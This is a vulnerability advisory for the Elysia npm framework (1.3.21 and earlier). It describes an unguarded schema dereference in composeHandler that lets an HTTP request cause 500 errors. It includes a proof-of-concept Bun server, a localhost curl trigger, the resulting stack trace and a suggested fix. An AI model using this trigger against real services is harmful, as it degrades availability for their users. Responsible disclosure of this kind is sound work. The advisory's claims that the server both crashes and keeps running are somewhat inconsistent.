# vuln-elysia-1.3.21-ddos

## Summary

Elysia (npm) is vulnerable to **Denial of Service (DoS)** due to unsafe dynamic code generation in the request handler composition.  
Through version **1.3.21 (latest tested)**, a crafted schema property or malformed input can trigger a crash inside `composeHandler` in `src/compose.ts`.  
This causes the server to throw an unhandled exception and return **HTTP 500 Internal Server Error** for valid requests, effectively allowing remote attackers to perform a DoS.

- **Vulnerability Class:** Improper Input Validation → Crash/DoS (CWE-20, CWE-248)  
- **Severity:** Medium/High (CVSS ~7.5)  
- **Exploitability:** Any attacker able to send crafted HTTP requests to an affected server can trigger this vulnerability.  

---

## Details

- **Package:** `elysia` (npm)  
- **Repository:** [github.com/elysiajs/elysia](https://github.com/elysiajs/elysia)  
- **Affected File:** [src/compose.ts](https://github.com/elysiajs/elysia/blob/main/src/compose.ts)  
- **Affected Function(s):** `composeHandler`, `compile`  
- **Affected Versions:** ≤ 1.3.21 (latest tested)  
- **Root Cause:** Dynamic handler generation assumes `schema.$defs[schema.$ref]` exists. Crafted input can bypass assumptions and cause a `TypeError`.

### Relevant code excerpt (compose.ts)
```ts
const properties =
  schema.properties ?? schema.$defs[schema.$ref].properties
```

If `schema.$defs` or `schema.$ref` is undefined due to attacker-controlled schema, the code throws:  
```
TypeError: undefined is not an object (evaluating 'schema.$defs[schema.$ref]')
```

---

## Proof of Concept (PoC)

### Vulnerable Server (poc-elysia-dos.mjs)
```js
import { Elysia, t } from 'elysia'

const app = new Elysia()
  .get('/hello', () => 'Hello World')
  .get('/dos', () => 'SAFE', {
    query: t.Record(t.String(), t.String())
  })
  .listen(3000)

console.log("Server listening on http://localhost:3000")
```

### Run the server
```bash
bun poc-elysia-dos.mjs
```

### Test normal route
```bash
curl http://localhost:3000/hello
# -> Hello World
```

### Trigger DoS
```bash
curl -i http://localhost:3000/dos?x=1
```

**Expected result:**  
The server crashes internally and responds with **500 Internal Server Error**.  
Clients see Bun’s error overlay HTML with stack trace:

```
TypeError: undefined is not an object (evaluating 'schema.$defs[schema.$ref]')
    at composeHandler (.../elysia/src/compose.ts:657:33)
    ...
```

### Demonstration
![DoS Attack Demonstration](poc-elysia-dos.gif)

---

## Attack Vector

- Any attacker who can send crafted requests to endpoints that use `t.Record` or similar schemas can reliably trigger a crash.  
- The server continues running, but valid requests fail until restart → effectively **Denial of Service**.

---

## Impact

- **Availability loss** for services using Elysia.  
- Remote attacker can crash endpoints at will.  
- In production, repeated exploitation can render the service unusable.  

**Vulnerability type:** Denial of Service (DoS) via malformed schema parsing  
**Affected users:** All applications using Elysia with schemas like `t.Record(...)` or other constructs that reach `schema.$defs`.

---

## Suggested Fix

- Add guards before dereferencing `schema.$defs[schema.$ref]`.  
- Reject malformed schema definitions early.  
- Add test cases for schema edge cases (e.g., empty `$ref`, missing `$defs`).

---

## Disclosure
- **Status:** Under responsible disclosure  
- **Disclosure Date:** 04 September 2025  
- **Reporter:** Manopakorn Kooharueangrong (Whyshealwaysbrokeme)
